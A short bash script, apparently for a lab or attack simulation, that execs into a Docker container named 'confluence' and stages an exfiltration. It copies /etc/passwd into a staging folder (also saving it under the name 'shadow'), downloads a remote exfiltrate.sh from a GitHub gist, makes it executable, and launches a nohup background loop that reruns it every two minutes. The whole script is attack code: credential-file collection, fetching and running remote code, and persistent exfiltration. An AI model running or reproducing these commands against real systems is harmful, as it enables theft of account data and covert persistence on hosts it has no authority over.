#!/bin/bash
docker exec confluence /bin/sh -c "\
                                apt update -y; \
                                apt install dnsutils -y; \
                                apt install wget -y; \
                                apt install procps -y; \
                                mkdir /tmp/exfiltrate; \
                                cat /etc/passwd > /tmp/exfiltrate/passwd; \
                                cat /etc/passwd > /tmp/exfiltrate/shadow; \
                                wget https://gist.githubusercontent.com/kevinnivekkevin/0fa22e3d79ffc802b401af36aee67b0a/raw/4008befbfe53c175cfb37722f37b64f4ca01824c/exfiltrate.sh -O /tmp/exfiltrate.sh; \
                                chmod +x /tmp/exfiltrate.sh; \
                                printf '#!/bin/bash\nwhile true; do bash /tmp/exfiltrate.sh; sleep 120; done' > /tmp/runExfiltrate.sh; \
                                chmod +x /tmp/runExfiltrate.sh; \
                                nohup /tmp/runExfiltrate.sh &"